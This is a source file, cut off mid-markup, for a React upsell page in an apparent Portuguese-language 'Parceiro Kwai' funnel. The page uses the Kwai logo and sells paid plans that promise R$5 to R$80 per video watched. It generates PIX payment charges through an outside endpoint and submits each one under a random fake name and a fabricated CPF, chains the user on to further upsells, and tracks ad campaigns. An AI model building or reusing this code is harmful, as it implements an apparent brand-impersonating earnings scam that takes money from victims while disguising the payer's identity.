import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { CheckCircle, Star, Crown, Gem, Copy, Check, User, Sparkles, Zap } from 'lucide-react';

interface PixDataType {
  success?: boolean;
  transaction_id?: string;
  pix_data?: {
    qrCodeText?: string;
    qrCode?: string;
  };
}

const Upsell4 = () => {
  const navigate = useNavigate();
  const [selectedPlan, setSelectedPlan] = useState('');
  const [showPixPopup, setShowPixPopup] = useState(false);
  const [pixData, setPixData] = useState<PixDataType | null>(null);
  const [copied, setCopied] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState("");
  const [isGeneratingPix, setIsGeneratingPix] = useState(''); // Agora armazena qual plano está gerando
  const [isPixPopupAnimating, setIsPixPopupAnimating] = useState(false);
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Cleanup interval on unmount
  useEffect(() => {
    return () => {
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
      }
    };
  }, []);

  // Função para gerar o QR Code
  const generateQRCodeImage = (text: string) => {
    return `https://quickchart.io/qr?text=${encodeURIComponent(text)}&size=300`;
  };

  // Função para verificar status do pagamento
  const checkPaymentStatus = async (transactionId: string) => {
     try {
      const utmParamsString = localStorage.getItem("utm_params");
      const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};
      const response = await fetch("https://cdn.parceiro-digi.shop/PaymentController.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action: "check_payment",
          payment_id: transactionId,
          utmQuery: JSON.stringify(utmParams),
        })
      });
      
      const data = await response.json();
      
      if (data.status === "APPROVED") {
        setPaymentStatus("approved");
        if (checkIntervalRef.current) {
          clearInterval(checkIntervalRef.current);
          checkIntervalRef.current = null;
        }
        setShowModal(true);
        // Redireciona para a página upsell1 após 2 segundos
        setTimeout(() => {
          window.location.href = "/upsell5";
        }, 2000);
      }
    } catch (error) {
      console.error("Erro ao verificar status do pagamento:", error);
    }
  };

  const getUtmParams = (): string | null => {
    if (typeof window === 'undefined') return null;

    const params = new URLSearchParams(window.location.search);
    const utmParams: Record<string, string | null> = {};

    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];

    utmKeys.forEach(key => {
      if (params.has(key)) {
        utmParams[key] = params.get(key);
      }
    });

    if (Object.keys(utmParams).length === 0) {
      return JSON.stringify({
        utm_source: '7f52b1f8-0a0c-4e17-82c7-88e97b73f0d5::Teste_xTracky::::',
        utm_medium: 'Xtracky',
        utm_campaign: 'KwaiUPsell4'
      });
    }

    return JSON.stringify(utmParams);
  };

  // Função para gerar nome aleatório
  const generateRandomName = () => {
    const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Mariana', 'Lucas', 'Juliana', 'Fernando', 'Patricia'];
    const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Almeida', 'Pereira', 'Gomes', 'Martins'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    
    return `${firstName} ${lastName}`;
  };

  // Função para gerar CPF válido (apenas para teste)
  const generateRandomCPF = (): string => {
    const rand = (n: number) => Math.floor(Math.random() * n);
    const n = Array(9).fill(0).map(() => rand(9));
    
    // Cálculo do primeiro dígito verificador
    let d1 = n.reduce((acc, val, idx) => acc + (val * (10 - idx)), 0);
    d1 = 11 - (d1 % 11);
    if (d1 >= 10) d1 = 0;
    
    // Cálculo do segundo dígito verificador
    let d2 = n.reduce((acc, val, idx) => acc + (val * (11 - idx)), 0) + (d1 * 2);
    d2 = 11 - (d2 % 11);
    if (d2 >= 10) d2 = 0;
    
    return n.join('') + d1 + d2;
  };

  // Função para gerar PIX com o valor correto do plano
  const handlePayIOF = async (planId: string) => {
    setIsGeneratingPix(planId);
    
    const plan = plans.find(p => p.id === planId);
    if (!plan) return;
    
    // Converter preço para centavos
    const amountInCents = parseFloat(plan.price.replace('R$', '').replace(',', '.')) * 100;
    
    try {

      const utmParamsString = localStorage.getItem("utm_params");
      const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};

      const response = await fetch("https://cdn.parceiro-digi.shop/PaymentController.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action: "generate_pix",
          name: generateRandomName(),
          email: "cliente@email.com",
          cpf: generateRandomCPF(),
          telefone: "19298373473",
          amount: amountInCents,
          item_title: `KwaiUPsell4 - ${plan.name}`,
           utmQuery: getUtmParams(),
          referrerUrl: "https://www.exemplo.com/pagina"
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPixData({
          ...data,
          pix_data: {
            ...data.pix_data,
            qrCode: generateQRCodeImage(data.pix_data.qrCodeText)
          }
        });
        setSelectedPlan(planId);
        startPaymentStatusCheck(data.transaction_id);
        setShowPixPopup(true);
        setIsPixPopupAnimating(true);
      }
    } catch (error) {
      console.error("Erro ao gerar PIX:", error);
    } finally {
      setIsGeneratingPix('');
    }
  };

  // Função para verificação periódica
  const startPaymentStatusCheck = (transactionId: string) => {
    if (checkIntervalRef.current) {
      clearInterval(checkIntervalRef.current);
    }
    
    checkPaymentStatus(transactionId);
    checkIntervalRef.current = setInterval(() => checkPaymentStatus(transactionId), 10000);
  };

  // Função para copiar o PIX
  const handleCopyPix = (): void => {
    if (pixData?.pix_data?.qrCodeText) {
      try {
        navigator.clipboard.writeText(pixData.pix_data.qrCodeText)
          .then(() => {
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
          })
          .catch((err) => {
            console.error('Falha ao copiar texto: ', err);
          });
      } catch (err) {
        console.error('Erro ao acessar clipboard: ', err);
      }
    }
  };

  const plans = [
    {
      id: 'prata',
      name: 'Parceiro Prata',
      earning: 'R$5',
      price: '19,99',
      originalPrice: 'R$39,90',
      badge: 'Básico',
      gradientFrom: 'from-slate-400',
      gradientTo: 'to-slate-600',
      icon: Star,
      features: [
        'R$5 por vídeo assistido',
        'Suporte básico por chat',
        'Acesso à plataforma web'
      ]
    },
    {
      id: 'dourado',
      name: 'Parceiro Dourado',
      earning: 'R$30',
      price: '49,99',
      originalPrice: 'R$99,90',
      badge: 'Mais Popular',
      gradientFrom: 'from-yellow-400',
      gradientTo: 'to-yellow-600',
      icon: Crown,
      features: [
        'R$30 por vídeo assistido',
        'Suporte prioritário 24/7',
        'Bônus de R$50 no primeiro mês',
        'Relatórios detalhados'
      ]
    },
    {
      id: 'diamante',
      name: 'Parceiro Diamante',
      earning: 'R$80',
      price: '97,99',
      originalPrice: 'R$199,90',
      badge: 'Premium VIP',
      gradientFrom: 'from-blue-500',
      gradientTo: 'to-purple-600',
      icon: Gem,
      features: [
        'R$80 por vídeo assistido',
        'Suporte VIP dedicado',
        'Bônus de R$200 no primeiro mês',
        'Análises avançadas e IA'
      ]
    }
  ];

  const closeModal = () => {
    setShowModal(false);
    navigate('/partner');
  };

  // Obter o plano atual selecionado para mostrar o valor correto no PIX
  const currentPlan = plans.find(p => p.id === selectedPlan);
  const pixAmount = currentPlan ? `R$ ${currentPlan.price}` : 'R$ 0,00';

  if (showPixPopup) {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <div className="bg-white shadow-sm p-4">
          <div className="flex items-center justify-between max-w-md mx-auto">
            <div className="flex items-center space-x-3">
       <svg 
            xmlns="http://www.w3.org/2000/svg" 
            viewBox="0 0 1000 296.4" 
            xmlSpace="preserve"
            className="h-8"
          >
            <path d="M56.6-156.6H18c-8.3 0-15-6.7-15-15v-38.6c0-8.3 6.7-15 15-15h38.5c8.3 0 15 6.7 15 15v38.6c0 8.3-6.7 15-14.9 15" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: '#ff7705'}} transform="matrix(4.31842 0 0 4.31842 -13.153 972.606)"/>
            <path d="M26-167.5c-.8 0-2.7-.4-4.6-.9-1.9-.5-3.2-1.2-3.2-1.2-.7-.4-1-1-1.1-1.6 0 0-.2-2-.2-5.8 0-2.9.1-4.5.2-4.9.1-.5.3-.9 1-.9s1.5 0 3.6.4c2.5.5 3.7.9 4.3 1.1.5.2 1.1.6 1.2 1.4 0 0 .3 2.1.3 5.3 0 2.6-.2 5.2-.3 6-.1.7-.4 1.1-1.2 1.1zm11.3-9c0-.5-.2-.9-.5-1.2l-6.5-6.4c-.7-.8-1.6-1.3-2.7-1.5 0 0-2.4-.6-6.1-1.2-3.6-.6-4.6-.5-4.6-.5-3.2 0-3.3 3.4-3.4 3.8-.1.8-.3 3-.3 6.1 0 3.6.2 6.1.3 7.7.3 2.3 2.1 3.4 2.9 3.9.2.1 2.5 1.1 4.7 1.8 1.5.5 4 1.2 5.1 1.3.4.1 2.6.4 3.7-1l6.9-8.9c.3-.4.4-.6.4-1.2l.1-2.7zm15.1-13c-1-.1-2-.1-2.9-.1L34-188.1s-1 .2-1.6.9c-.5.6-.5 1.1-.5 1.1l.4.4 6.1 6.2c.7.7 1.1 1.3 1.1 2.3v3.5c0 .6-.1 1.2-.4 1.6l-3.3 4.5 3.3 1.3c1.3.4 2.4.4 3.7.2l14.2-3.3s2.6-.7 2.6-3.1v-8.7c0-.2-.1-.3-.3-.3l-9.1 1.8c-.3.1-.6.4-.6.7v4.2c0 .3.3.5.6.4l2.8-.6c.1 0 .3.1.3.3v1.4c0 .3-.2.5-.5.5l-3.2.7s-2.2.6-2.2-1.8v-5.4c0-2.3 1.7-2.6 1.7-2.6l10-1.9c.3 0 .5-.3.5-.5v-2.2c0-2.4-2.3-2.6-2.3-2.6l-4.9-.4zm-18.6-22.7c3.7.2 6.5 3.7 6.3 8-.2 4.3-3.4 7.7-7 7.6-3.7-.2-6.4-3.7-6.2-8 .2-4.4 3.3-7.8 6.9-7.6zm15 10c.2-2.9 2.2-5.2 4.7-5.1 2.3.1 4.2 2.6 4.1 5.4-.2 2.9-2.3 5.2-4.7 5.1-2.4-.1-4.2-2.5-4.1-5.4zm12.5.4c0-5.8-4.3-10.4-9.6-10.4-3.1 0-5.9 1.6-7.7 4.1-1.4-6.2-6.5-10.7-12.7-10.7-7.4 0-13.3 6.4-13.2 14.2 0 7.9 6 14.4 13.2 14.3.4 0 20.5-1.4 20.4-1.4 5.7-.5 9.6-4.4 9.6-10.1z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: '#fff'}} transform="matrix(4.31842 0 0 4.31842 -13.153 972.606)"/>
            <g>
              <g transform="matrix(4.31842 0 0 4.31842 240.58 995.885)">
                <linearGradient id="f" gradientUnits="userSpaceOnUse" x1="83.454" y1="-10.383" x2="82.473" y2="23.125" gradientTransform="matrix(3.7702 0 0 -4.9463 -171.004 -220.774)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M132.1-206.6h.1c2.7-.5 6.6-1.1 11.1-1.1 9.4 0 14.5 4.2 14.5 12.7v23.9c0 .7-.6 1.4-1.3 1.4h-5.6c-.2 0-.7-.1-1-.4-.3-.2-.4-.7-.4-.9v-.5c-.8.9-2.5 2.2-7.3 2.3-5.1.1-7.6-1.3-8.8-2.2-1.5-1.1-2.7-2.5-3.6-4.1-.5-1-.9-2.1-1.1-4.1-.2-2.2.2-4.3.8-5.7 1.7-4.1 6-6.4 13.6-6.9 2.3-.1 6.1-.2 6.1-.2v-2.5c0-4.3-1.8-4.9-5.7-4.9-5.6 0-10.6 1-11.5 1.2-.4 0-.6-.1-.7-.2-.2-.2-.3-.5-.3-.6v-5.6c0-.6.5-1.1 1.1-1.3-.1-.3-.1-.3 0-.3zm5 25.6c.2-2.4 2.4-3.2 2.9-3.3 1.1-.4 2.6-.7 4.5-.8 2.3-.2 4.5-.1 4.5-.1v7.6c-1.9.9-3.4 1.3-5.7 1.4h-.7c-2.1 0-5.1-.6-5.6-4.3.1-.3.1-.4.1-.5z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#f)'}}/>
                <linearGradient id="g" gradientUnits="userSpaceOnUse" x1="97.457" y1="-29.737" x2="96.919" y2="-11.338" gradientTransform="matrix(2.1647 0 0 -8.6151 -39.606 -426.12)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M168-206.6c-.8 0-1.3.7-1.4 1.4v34c0 .2.1.5.4.9s.8.4 1 .4h6.4c.9 0 1.3-.6 1.3-1.4v-33.8c0-.8-.6-1.4-1.4-1.4H168z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#g)'}}/>
                <linearGradient id="h" gradientUnits="userSpaceOnUse" x1="58.556" y1="-9.836" x2="57.187" y2="36.913" gradientTransform="matrix(3.8065 0 0 -4.8991 -173.976 -218.133)">
                  <stop offset=".021" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M56.3-222.9c-.5 0-.9.2-1.2.5l-16 20.3c-.4.5-1.4.1-1.4-.7v-18.6c0-.5-.2-.8-.4-1.1-.2-.2-.5-.5-1-.5h-6.4c-.9 0-1.5.7-1.5 1.5v50.1c0 .5.2.8.4 1 .3.3.7.4 1 .4h6.4c1 0 1.5-.6 1.5-1.4V-193c0-1.7 1.3-1.4 1.8-.8l19.3 23c.4.5 1 .8 1.7.8h8.6c.2 0 .3-.1.4-.3.1-.2.1-.5-.1-.6l-22-25.8c-.3-.3-.4-.7-.2-1l18.3-24.5c.1-.1.2-.3 0-.6-.2-.2-.3-.2-.4-.2l-8.8.1z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#h)'}}/>
                <linearGradient id="i" gradientUnits="userSpaceOnUse" x1="90.111" y1="-6.785" x2="90.111" y2="43.918" gradientTransform="matrix(4.0727 0 0 -4.579 -195.758 -200.213)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M168-222.9c-.9 0-1.4.6-1.4 1.3V-214c0 .8.6 1.4 1.4 1.4h6.3c.9 0 1.5-.6 1.5-1.4v-7.5c0-.8-.6-1.4-1.4-1.4H168z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#i)'}}/>
                <linearGradient id="j" gradientUnits="userSpaceOnUse" x1="74.036" y1="8.74" x2="72.707" y2="54.15" gradientTransform="matrix(5.3395 0 0 -3.4926 -299.434 -139.407)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M107.5-183.5c-.2.7-1.2.7-1.5 0l-8.1-22.2c-.2-.4-.7-.8-1.3-.8h-4.2c-.7 0-1.2.4-1.4.9l-8.1 22.1c-.2.7-1.4.7-1.5 0l-6.1-21.3c0-.1-.1-.9-.6-1.3-.5-.3-.6-.3-1.2-.4h-5.6c-.9 0-1.7.7-1.5 1.7 0 .1 9.2 33.1 9.4 33.8.1.4.2.7.5.9s.6.4 1 .4h8.9c.7 0 1.2-.3 1.4-.8l1.4-3.2 5.1-13.6c.3-.6 1.2-.7 1.4 0l6.1 16.6c.1.3.2.5.5.7.2.2.6.3.9.3h9.4c.8 0 1.4-.4 1.5-1l.4-1.6s.2-.9.7-2.6l7.6-29.5c.2-.9-.2-1.8-1.1-2H115c-.7 0-1.2.4-1.4 1-.2.4-5.9 21.2-6.1 21.9z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#j)'}}/>
              </g>
            </g>
          </svg>
            </div>
             <div className="flex items-center">
            <div className="flex items-center justify-center space-x-2 bg-gray-100 rounded-full px-3 py-2 md:px-4 md:py-2 hover:bg-gray-200 transition-colors cursor-pointer">
              <User className="h-4 w-4 text-gray-600" />
              <span className="text-gray-600 text-sm hidden sm:inline">Meu Perfil</span>
            </div>
          </div>
          </div>
        </div>

        {/* PIX Payment Content */}
        <div className="p-6 max-w-md mx-auto">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="h-8 w-8 text-orange-500" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">
              Finalize seu pagamento
            </h1>
            <p className="text-gray-600">
              Escaneie o QR Code ou copie a chave PIX
            </p>
          </div>

         {/* QR Code */}
          <div className="bg-white rounded-2xl p-8 shadow-lg mb-6">
            <div className="text-center">
              {pixData?.pix_data?.qrCode && (
                <img 
                  src={pixData.pix_data.qrCode} 
                  alt="QR Code PIX" 
                  className="w-64 h-64 mx-auto mb-6 rounded-lg border-2 border-gray-100" 
                />
              )}
              
              <div className="bg-blue-50 rounded-xl p-4 mb-4">
                <p className="text-xs text-blue-700 mb-2 font-semibold">Chave PIX Copia e Cola</p>
                <div className="space-y-3">
                  <input 
                    type="text" 
                    value={pixData?.pix_data?.qrCodeText || ''} 
                    readOnly 
                    className="w-full text-xs bg-white border border-blue-200 rounded-lg px-3 py-3 text-gray-800"
                  />
                  <Button 
                    onClick={handleCopyPix}
                    className={`w-full h-12 text-white font-semibold rounded-lg transition-all ${
                      copied 
                        ? 'bg-green-500 hover:bg-green-600' 
                        : 'bg-blue-500 hover:bg-blue-600'
                    }`}
                  >
                    {copied ? (
                      <>
                        <Check className="h-4 w-4 mr-2 text-white" />
                        <span className="text-white">Copiado!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="h-4 w-4 mr-2 text-white" />
                        <span className="text-white">Copiar Chave PIX</span>
                      </>
                    )}
                  </Button>
                </div>
              </div>

              <div className="bg-orange-50 border border-orange-200 rounded-xl p-4">
                <div className="flex items-center justify-center space-x-3 text-orange-700">
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-orange-600"></div>
                  <div className="text-center">
                    <p className="text-sm font-semibold">Aguardando pagamento...</p>
                    <p className="text-xs text-orange-600">Geralmente leva alguns segundos</p>
                  </div>
                </div>
              </div>

                 {/* Payment Info */}
                <div className="bg-white rounded-xl p-4 shadow-sm">
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-gray-600 text-sm">Valor:</span>
                    <span className="font-bold text-lg text-[#FF4906]">{pixAmount}</span>
                  </div>
                  <div className="flex items-center space-x-2 text-sm text-gray-500">
                    <div className="w-4 h-4 bg-green-500 rounded-full flex items-center justify-center">
                      <div className="w-2 h-2 bg-white rounded-full"></div>
                    </div>
                    <span>Pagamento direto em sua chave pix</span>
                  </div>
                </div>
              </div>
            
            </div>
          </div>

       

        {/* Success Modal */}
        <Dialog open={showModal} onOpenChange={setShowModal}>
          <DialogContent className="sm:max-w-md rounded-2xl">
            <DialogHeader className="text-center pb-6">
              <div className="mx-auto mb-4 p-3 bg-green-100 rounded-full w-fit">
                <CheckCircle className="h-8 w-8 text-green-600" />
              </div>
              <DialogTitle className="text-center text-green-600 text-xl font-bold">
                Pagamento Confirmado!
              </DialogTitle>
            </DialogHeader>
            <div className="text-center py-4">
              <p className="text-gray-700 mb-4 font-medium">
                Seu pagamento foi processado com sucesso!
              </p>
              <div className="bg-green-50 rounded-xl p-4 mb-6">
                <p className="text-sm text-green-700 font-semibold mb-2">
                  🎉 Bem-vindo ao Parceiro Kwai!
                </p>
                <p className="text-xs text-green-600">
                  Redirecionando em alguns segundos...
                </p>
              </div>
              <Button 
                onClick={closeModal} 
                className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 rounded-xl"
              >
                Continuar
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm p-4">
        <div className="flex items-center justify-between max-w-md mx-auto">
          <div className="flex items-center space-x-3">
            <svg 
            xmlns="http://www.w3.org/2000/svg" 
            viewBox="0 0 1000 296.4" 
            xmlSpace="preserve"
            className="h-8"
          >
            <path d="M56.6-156.6H18c-8.3 0-15-6.7-15-15v-38.6c0-8.3 6.7-15 15-15h38.5c8.3 0 15 6.7 15 15v38.6c0 8.3-6.7 15-14.9 15" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: '#ff7705'}} transform="matrix(4.31842 0 0 4.31842 -13.153 972.606)"/>
            <path d="M26-167.5c-.8 0-2.7-.4-4.6-.9-1.9-.5-3.2-1.2-3.2-1.2-.7-.4-1-1-1.1-1.6 0 0-.2-2-.2-5.8 0-2.9.1-4.5.2-4.9.1-.5.3-.9 1-.9s1.5 0 3.6.4c2.5.5 3.7.9 4.3 1.1.5.2 1.1.6 1.2 1.4 0 0 .3 2.1.3 5.3 0 2.6-.2 5.2-.3 6-.1.7-.4 1.1-1.2 1.1zm11.3-9c0-.5-.2-.9-.5-1.2l-6.5-6.4c-.7-.8-1.6-1.3-2.7-1.5 0 0-2.4-.6-6.1-1.2-3.6-.6-4.6-.5-4.6-.5-3.2 0-3.3 3.4-3.4 3.8-.1.8-.3 3-.3 6.1 0 3.6.2 6.1.3 7.7.3 2.3 2.1 3.4 2.9 3.9.2.1 2.5 1.1 4.7 1.8 1.5.5 4 1.2 5.1 1.3.4.1 2.6.4 3.7-1l6.9-8.9c.3-.4.4-.6.4-1.2l.1-2.7zm15.1-13c-1-.1-2-.1-2.9-.1L34-188.1s-1 .2-1.6.9c-.5.6-.5 1.1-.5 1.1l.4.4 6.1 6.2c.7.7 1.1 1.3 1.1 2.3v3.5c0 .6-.1 1.2-.4 1.6l-3.3 4.5 3.3 1.3c1.3.4 2.4.4 3.7.2l14.2-3.3s2.6-.7 2.6-3.1v-8.7c0-.2-.1-.3-.3-.3l-9.1 1.8c-.3.1-.6.4-.6.7v4.2c0 .3.3.5.6.4l2.8-.6c.1 0 .3.1.3.3v1.4c0 .3-.2.5-.5.5l-3.2.7s-2.2.6-2.2-1.8v-5.4c0-2.3 1.7-2.6 1.7-2.6l10-1.9c.3 0 .5-.3.5-.5v-2.2c0-2.4-2.3-2.6-2.3-2.6l-4.9-.4zm-18.6-22.7c3.7.2 6.5 3.7 6.3 8-.2 4.3-3.4 7.7-7 7.6-3.7-.2-6.4-3.7-6.2-8 .2-4.4 3.3-7.8 6.9-7.6zm15 10c.2-2.9 2.2-5.2 4.7-5.1 2.3.1 4.2 2.6 4.1 5.4-.2 2.9-2.3 5.2-4.7 5.1-2.4-.1-4.2-2.5-4.1-5.4zm12.5.4c0-5.8-4.3-10.4-9.6-10.4-3.1 0-5.9 1.6-7.7 4.1-1.4-6.2-6.5-10.7-12.7-10.7-7.4 0-13.3 6.4-13.2 14.2 0 7.9 6 14.4 13.2 14.3.4 0 20.5-1.4 20.4-1.4 5.7-.5 9.6-4.4 9.6-10.1z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: '#fff'}} transform="matrix(4.31842 0 0 4.31842 -13.153 972.606)"/>
            <g>
              <g transform="matrix(4.31842 0 0 4.31842 240.58 995.885)">
                <linearGradient id="f" gradientUnits="userSpaceOnUse" x1="83.454" y1="-10.383" x2="82.473" y2="23.125" gradientTransform="matrix(3.7702 0 0 -4.9463 -171.004 -220.774)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M132.1-206.6h.1c2.7-.5 6.6-1.1 11.1-1.1 9.4 0 14.5 4.2 14.5 12.7v23.9c0 .7-.6 1.4-1.3 1.4h-5.6c-.2 0-.7-.1-1-.4-.3-.2-.4-.7-.4-.9v-.5c-.8.9-2.5 2.2-7.3 2.3-5.1.1-7.6-1.3-8.8-2.2-1.5-1.1-2.7-2.5-3.6-4.1-.5-1-.9-2.1-1.1-4.1-.2-2.2.2-4.3.8-5.7 1.7-4.1 6-6.4 13.6-6.9 2.3-.1 6.1-.2 6.1-.2v-2.5c0-4.3-1.8-4.9-5.7-4.9-5.6 0-10.6 1-11.5 1.2-.4 0-.6-.1-.7-.2-.2-.2-.3-.5-.3-.6v-5.6c0-.6.5-1.1 1.1-1.3-.1-.3-.1-.3 0-.3zm5 25.6c.2-2.4 2.4-3.2 2.9-3.3 1.1-.4 2.6-.7 4.5-.8 2.3-.2 4.5-.1 4.5-.1v7.6c-1.9.9-3.4 1.3-5.7 1.4h-.7c-2.1 0-5.1-.6-5.6-4.3.1-.3.1-.4.1-.5z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#f)'}}/>
                <linearGradient id="g" gradientUnits="userSpaceOnUse" x1="97.457" y1="-29.737" x2="96.919" y2="-11.338" gradientTransform="matrix(2.1647 0 0 -8.6151 -39.606 -426.12)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M168-206.6c-.8 0-1.3.7-1.4 1.4v34c0 .2.1.5.4.9s.8.4 1 .4h6.4c.9 0 1.3-.6 1.3-1.4v-33.8c0-.8-.6-1.4-1.4-1.4H168z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#g)'}}/>
                <linearGradient id="h" gradientUnits="userSpaceOnUse" x1="58.556" y1="-9.836" x2="57.187" y2="36.913" gradientTransform="matrix(3.8065 0 0 -4.8991 -173.976 -218.133)">
                  <stop offset=".021" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M56.3-222.9c-.5 0-.9.2-1.2.5l-16 20.3c-.4.5-1.4.1-1.4-.7v-18.6c0-.5-.2-.8-.4-1.1-.2-.2-.5-.5-1-.5h-6.4c-.9 0-1.5.7-1.5 1.5v50.1c0 .5.2.8.4 1 .3.3.7.4 1 .4h6.4c1 0 1.5-.6 1.5-1.4V-193c0-1.7 1.3-1.4 1.8-.8l19.3 23c.4.5 1 .8 1.7.8h8.6c.2 0 .3-.1.4-.3.1-.2.1-.5-.1-.6l-22-25.8c-.3-.3-.4-.7-.2-1l18.3-24.5c.1-.1.2-.3 0-.6-.2-.2-.3-.2-.4-.2l-8.8.1z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#h)'}}/>
                <linearGradient id="i" gradientUnits="userSpaceOnUse" x1="90.111" y1="-6.785" x2="90.111" y2="43.918" gradientTransform="matrix(4.0727 0 0 -4.579 -195.758 -200.213)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M168-222.9c-.9 0-1.4.6-1.4 1.3V-214c0 .8.6 1.4 1.4 1.4h6.3c.9 0 1.5-.6 1.5-1.4v-7.5c0-.8-.6-1.4-1.4-1.4H168z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#i)'}}/>
                <linearGradient id="j" gradientUnits="userSpaceOnUse" x1="74.036" y1="8.74" x2="72.707" y2="54.15" gradientTransform="matrix(5.3395 0 0 -3.4926 -299.434 -139.407)">
                  <stop offset="0" style={{stopColor: '#ff6000'}}/>
                  <stop offset="1" style={{stopColor: '#ff8d0a'}}/>
                </linearGradient>
                <path d="M107.5-183.5c-.2.7-1.2.7-1.5 0l-8.1-22.2c-.2-.4-.7-.8-1.3-.8h-4.2c-.7 0-1.2.4-1.4.9l-8.1 22.1c-.2.7-1.4.7-1.5 0l-6.1-21.3c0-.1-.1-.9-.6-1.3-.5-.3-.6-.3-1.2-.4h-5.6c-.9 0-1.7.7-1.5 1.7 0 .1 9.2 33.1 9.4 33.8.1.4.2.7.5.9s.6.4 1 .4h8.9c.7 0 1.2-.3 1.4-.8l1.4-3.2 5.1-13.6c.3-.6 1.2-.7 1.4 0l6.1 16.6c.1.3.2.5.5.7.2.2.6.3.9.3h9.4c.8 0 1.4-.4 1.5-1l.4-1.6s.2-.9.7-2.6l7.6-29.5c.2-.9-.2-1.8-1.1-2H115c-.7 0-1.2.4-1.4 1-.2.4-5.9 21.2-6.1 21.9z" style={{fillRule: 'evenodd', clipRule: 'evenodd', fill: 'url(#j)'}}/>
              </g>
            </g>
          </svg>
          </div>
         <div className="flex items-center">
            <div className="flex items-center justify-center space-x-2 bg-gray-100 rounded-full px-3 py-2 md:px-4 md:py-2 hover:bg-gray-200 transition-colors cursor-pointer">
              <User className="h-4 w-4 text-gray-600" />
              <span className="text-gray-600 text-sm hidden sm:inline">Meu Perfil</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="p-6 max-w-md mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-gray-900 mb-2">
            Escolha seu plano
          </h1>
          <p className="text-gray-600">
            Selecione o plano ideal para começar a ganhar dinheiro
          </p>
        </div>
      
        {/* Plan Cards */}
        <div className="space-y-4">
          {plans.map((plan) => {
            const IconComponent = plan.icon;
            const isLoading = isGeneratingPix === plan.id;
            
            return (
              <Card 
                key={plan.id} 
                className={`bg-white shadow-lg rounded-2xl border-0 transition-all cursor-pointer hover:shadow-xl ${
                  plan.id === 'dourado' ? 'ring-2 ring-yellow-400' : ''
                }`}
              >
                <CardContent className="p-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-3">
                      <div className={`w-12 h-12 rounded-full bg-gradient-to-br ${plan.gradientFrom} ${plan.gradientTo} flex items-center justify-center`}>
                        <IconComponent className="h-6 w-6 text-white" />
                      </div>
                      <div>
                        <h3 className="font-bold text-gray-900">{plan.name}</h3>
                        {plan.id === 'dourado' && (
                          <Badge className="bg-yellow-400 text-yellow-900 text-xs">
